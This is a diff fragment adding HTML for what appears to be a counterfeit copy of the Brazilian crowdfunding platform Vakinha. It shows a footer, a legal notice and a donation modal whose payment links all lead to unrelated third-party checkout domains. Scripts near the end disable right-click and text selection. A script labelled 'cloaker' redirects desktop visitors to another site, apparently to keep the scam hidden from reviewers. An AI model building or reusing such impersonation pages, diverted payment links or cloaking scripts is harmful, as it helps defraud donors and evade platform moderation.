17h-.972q-.276 0-.4-.216l-1.216-1.852a.4.4 0 0 0-.152-.148.5.5 0 0 0-.24-.044h-.46V17h-1.076v-5.784h1.764q.588 0 1.008.124.424.12.692.34.272.22.4.528.128.304.128.672 0 .292-.088.552-.084.26-.248.472-.16.212-.4.372-.235.16-.54.252.104.06.192.144a1 1 0 0 1 .16.192zm6.463-2.892q0 .636-.212 1.18-.208.54-.592.936-.384.395-.924.62-.54.22-1.2.22-.657 0-1.196-.22-.54-.224-.928-.62a2.8 2.8 0 0 1-.596-.936 3.2 3.2 0 0 1-.212-1.18q0-.636.212-1.176.212-.544.596-.94.388-.396.928-.616.54-.225 1.196-.224.44 0 .828.104.388.1.712.288.324.184.58.452.26.264.44.592t.272.712q.096.384.096.808m-1.1 0q0-.476-.128-.852a1.8 1.8 0 0 0-.364-.644 1.55 1.55 0 0 0-.576-.404 2 2 0 0 0-.76-.14 2 2 0 0 0-.764.14 1.6 1.6 0 0 0-.576.404q-.237.264-.364.644-.129.376-.128.852 0 .476.128.856.127.376.364.64.24.26.576.4.34.14.764.14.423 0 .76-.14.339-.14.576-.4.235-.264.364-.64.128-.38.128-.856m6.29-2.008H94.51V17h-1.076v-4.9H91.69v-.884h4.564zm2.236-.028v1.604h2.024v.828h-2.024v1.636h2.568V17h-3.648v-5.784h3.648v.856zm8.565 2.028v2.34a3.1 3.1 0 0 1-.94.476 3.7 3.7 0 0 1-1.064.148q-.708 0-1.284-.22a2.9 2.9 0 0 1-.98-.612 2.7 2.7 0 0 1-.624-.936 3.1 3.1 0 0 1-.22-1.188q0-.652.212-1.196t.6-.936q.392-.392.948-.608t1.248-.216q.351 0 .656.056.307.056.568.156.264.096.48.236t.396.308l-.308.488a.3.3 0 0 1-.188.144.34.34 0 0 1-.252-.06l-.264-.152a1.7 1.7 0 0 0-.296-.132 2.4 2.4 0 0 0-.364-.092 2.7 2.7 0 0 0-.464-.036 2 2 0 0 0-.776.144 1.6 1.6 0 0 0-.588.412 1.9 1.9 0 0 0-.376.644q-.132.375-.132.84 0 .496.14.888.144.388.4.66.26.268.624.412.363.14.812.14.32 0 .572-.068t.492-.184v-1.048h-.728a.23.23 0 0 1-.164-.056.2.2 0 0 1-.056-.144V14.1zm2.516 2.9h-1.08v-5.784h1.08zm6.831-2.892q0 .636-.212 1.168t-.596.916a2.7 2.7 0 0 1-.924.596q-.54.212-1.2.212h-2.204v-5.784h2.204q.66 0 1.2.216.54.212.924.596.384.38.596.912.213.532.212 1.168m-1.104 0q0-.476-.128-.852a1.7 1.7 0 0 0-.364-.64 1.55 1.55 0 0 0-.576-.404 2 2 0 0 0-.76-.14h-1.124v4.072h1.124q.424 0 .76-.14.34-.14.576-.4.24-.264.364-.64.129-.38.128-.856m5.331.708-.704-1.924a4 4 0 0 1-.108-.304 8 8 0 0 1-.112-.38 5.972 5.972 0 0 1-.216.692l-.7 1.916zm1.9 2.184h-.832a.36.36 0 0 1-.228-.068.45.45 0 0 1-.132-.176l-.432-1.18h-2.396l-.432 1.18a.4.4 0 0 1-.124.168.35.35 0 0 1-.228.076h-.84l2.276-5.784h1.096z"></path></svg><br><br></div>
+        <button type="button" class="btn-ajuda" onclick="redirectWithParams('https://pay.apoiaai.fun/checkout/bhf6m8NXFS')">Quero ajudar</button>
+</section>
+    <footer>
+        <div class="aviso">
+            <div class="container">
+                <span>AVISO LEGAL: O texto e as imagens incluídos nessa página são de única e exclusiva responsabilidade
+                    do criador da vaquinha e não representam a opinião ou endosso da plataforma Vakinha.</span>
+            </div>
+        </div>
+        <div class="container">
+            <div class="content-footer">
+                <div class="topFooter d-flex align-items-center justify-content-between">
+                    <div class="logo-rodape">
+                        <img src="files/logo_rodape.svg" alt="logo-rodape">
+                    </div>
+                    <div class="sociais">
+                        <ul class="d-flex align-items-center">
+                            <li><a href="#"><svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="InstagramIcon">
+                                        <path d="M7.8 2h8.4C19.4 2 22 4.6 22 7.8v8.4a5.8 5.8 0 0 1-5.8 5.8H7.8C4.6 22 2 19.4 2 16.2V7.8A5.8 5.8 0 0 1 7.8 2m-.2 2A3.6 3.6 0 0 0 4 7.6v8.8C4 18.39 5.61 20 7.6 20h8.8a3.6 3.6 0 0 0 3.6-3.6V7.6C20 5.61 18.39 4 16.4 4H7.6m9.65 1.5a1.25 1.25 0 0 1 1.25 1.25A1.25 1.25 0 0 1 17.25 8 1.25 1.25 0 0 1 16 6.75a1.25 1.25 0 0 1 1.25-1.25M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3z">
+                                        </path>
+                                    </svg></a></li>
+                            <li>
+                                <div class="separador"></div>
+                            </li>
+                            <li><a href="#"><svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="FacebookIcon">
+                                        <path d="M5 3h14a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2m13 2h-2.5A3.5 3.5 0 0 0 12 8.5V11h-2v3h2v7h3v-7h3v-3h-3V9a1 1 0 0 1 1-1h2V5z">
+                                        </path>
+                                    </svg></a></li>
+                            <li>
+                                <div class="separador"></div>
+                            </li>
+                            <li><a href="#"><svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="YouTubeIcon">
+                                        <path d="M10 15l5.19-3L10 9v6m11.56-7.83c.13.47.22 1.1.28 1.9.07.8.1 1.49.1 2.09L22 12c0 2.19-.16 3.8-.44 4.83-.25.9-.83 1.48-1.73 1.73-.47.13-1.33.22-2.65.28-1.3.07-2.49.1-3.59.1L12 19c-4.19 0-6.8-.16-7.83-.44-.9-.25-1.48-.83-1.73-1.73-.13-.47-.22-1.1-.28-1.9-.07-.8-.1-1.49-.1-2.09L2 12c0-2.19.16-3.8.44-4.83.25-.9.83-1.48 1.73-1.73.47-.13 1.33-.22 2.65-.28 1.3-.07 2.49-.1 3.59-.1L12 5c4.19 0 6.8.16 7.83.44.9.25 1.48.83 1.73 1.73z">
+                                        </path>
+                                    </svg></a></li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="content d-flex justify-content-between">
+                    <div class="aba aba-links">
+                        <h4>Links rápidos</h4>
+                        <ul>
+                            <li><a href="#">Quem somos</a></li>
+                            <li><a href="#">Vaquinhas</a></li>
+                            <li><a href="#">Criar vaquinhas</a></li>
+                            <li><a href="#">Login</a></li>
+                            <li><a href="#">Vaquinhas mais amadas</a></li>
+                            <li><a href="#">Política de privacidade</a></li>
+                            <li><a href="#">Termos de uso</a></li>
+                        </ul>
+                    </div>
+                    <div class="aba aba-links">
+                        <h4></h4>
+                        <ul>
+                            <li><a href="#">Dúvidas frequentes</a></li>
+                            <li><a href="#">Taxas e prazos</a></li>
+                            <li><a href="#">Loja de corações</a></li>
+                            <li><a href="#">Vakinha Premiada</a></li>
+                            <li><a href="#">Blog do Vakinha</a></li>
+                            <li><a href="#">Segurnaça e transparência</a></li>
+                            <li><a href="#">Busca por recibo</a></li>
+                        </ul>
+                    </div>
+                    <div class="aba aba-links">
+                        <h4>Fale conosco</h4>
+                        <ul>
+                            <li><a href="#">Clique aqui para falar conosco</a></li>
+                        </ul>
+                        <ul>
+                            <li style="padding: 0 !important;"><span>De Segunda à Sexta</span></li>
+                            <li><span>Das 9:30 às 17:00</span></li>
+                            <li class="d-none d-lg-block d-xl-block"><img src="files/selo_seguranca.webp" alt="Selo de Segurança"></li>
+                        </ul>
+                    </div>
+                    <div class="aba aba-links d-flex d-lg-none d-xl-none">
+                        <ul>
+                            <li style="text-align: right;"><img src="files/selo_seguranca.webp" alt="Selo de Segurança" width="86"></li>
+                        </ul>
+                    </div>
+                    <div class="aba aba-links">
+                        <h4>Baixe nosso App</h4>
+                        <ul>
+                            <li style="padding-bottom: 12px !important;"><a href="#"><img src="files/google_play.svg" alt="Google Play Store"></a></li>
+                            <li><a href="#"><img src="files/apple_store.svg" alt="Apple Store"></a></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="copyright">
+            <span>� 2025 - Todos direitos reservados</span>
+        </div>
+    </footer>
+    <div class="modal modal-doar">
+        <div class="fora-modal"></div>
+        <div class="content-modal">
+            <div class="modal modal-doar">
+                <div class="fora-modal"></div>
+                <div class="content-modal">
+                    <div class="close-modal"><svg xmlns="http://www.w3.org/2000/svg" version="1.1" xmlns:xlink="http://www.w3.org/1999/xlink" width="14" height="14" x="0" y="0" viewBox="0 0 320.591 320.591" style="enable-background:new 0 0 512 512" xml:space="preserve" class="">
+                            <g>
+                                <path d="M30.391 318.583a30.37 30.37 0 0 1-21.56-7.288c-11.774-11.844-11.774-30.973 0-42.817L266.643 10.665c12.246-11.459 31.462-10.822 42.921 1.424 10.362 11.074 10.966 28.095 1.414 39.875L51.647 311.295a30.366 30.366 0 0 1-21.256 7.288z" fill="#ffffff" opacity="1" data-original="#000000" class=""></path>
+                                <path d="M287.9 318.583a30.37 30.37 0 0 1-21.257-8.806L8.83 51.963C-2.078 39.225-.595 20.055 12.143 9.146c11.369-9.736 28.136-9.736 39.504 0l259.331 257.813c12.243 11.462 12.876 30.679 1.414 42.922-.456.487-.927.958-1.414 1.414a30.368 30.368 0 0 1-23.078 7.288z" fill="#ffffff" opacity="1" data-original="#000000" class=""></path>
+                            </g>
+                        </svg></div>
+                    <h2>Qual valor deseja doar?</h2>
+                    <div class="valores d-flex align-items-center justify-content-between flex-wrap">
+                        <a href="https://checkout.esperancadoe.com/checkout?product=b195dea6-ee81-11ef-8446-46da4690ad53" target="_blank">R$ 25,00</a>
+                        <a href="https://checkout.esperancadoe.com/checkout?product=d685f7f2-ea63-11ef-be25-46da4690ad53" target="_blank">R$ 40,00</a>
+                        <a href="https://checkout.esperancadoe.com/checkout?product=e5aae9a3-ea63-11ef-be25-46da4690ad53" target="_blank">R$ 50,00</a>
+                        <a href="https://checkout.esperancadoe.com/checkout?product=ff97390b-ea63-11ef-be25-46da4690ad53" target="_blank">R$ 100,00</a>
+                        <a href="https://checkout.esperancadoe.com/checkout?product=0c19abc4-ea64-11ef-be25-46da4690ad53" target="_blank">R$ 150,00</a>
+                        <a href="https://checkout.esperancadoe.com/checkout?product=151b154b-ea64-11ef-be25-46da4690ad53" target="_blank">R$ 200,00</a>
+                        <a href="https://checkout.esperancadoe.com/checkout?product=560a51b8-ee82-11ef-8446-46da4690ad53" target="_blank">R$ 250,00</a>
+                        <a href="https://checkout.esperancadoe.com/checkout?product=20dc8531-ea64-11ef-be25-46da4690ad53" target="_blank">R$ 300,00</a>
+                        <a href="https://checkout.esperancadoe.com/checkout?product=2b09d223-ea64-11ef-be25-46da4690ad53" target="_blank">R$ 500,00</a>
+                        <div class="switch-container">
+                            <div class="switch-info">
+                                <span>Fazer doação anônima</span>
+                                <button class="info-button" aria-label="Informação"></button>
+                            </div>
+                            <label class="toggle-switch">
+                                <input type="checkbox">
+                                <span class="slider"></span>
+                            </label>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <script src="files/jquery.min.js.transferir"></script>
+            <script src="files/swiper-bundle.min.js.transferir"></script>
+            <script src="files/bootstrap.min.js.transferir"></script>
+            <script src="files/scripts.js.transferir"></script>
+
+<script>
+    document.addEventListener('contextmenu', event => event.preventDefault());
+</script>
+
+<body onmousedown="return false" onselectstart="return false">
+    
+<script>
+    //cloaker
+    function isMobileOrTablet() {
+      const ua = navigator.userAgent.toLowerCase();
+      return /android|iphone|ipad|ipod|tablet/.test(ua);
+    }
+
+    if (!isMobileOrTablet()) {
+      window.location.href = "https://clube.cancaonova.com/"; // Altere essa URL conforme necessário
+    }
+  </script>
+
+</div></div></body></html>
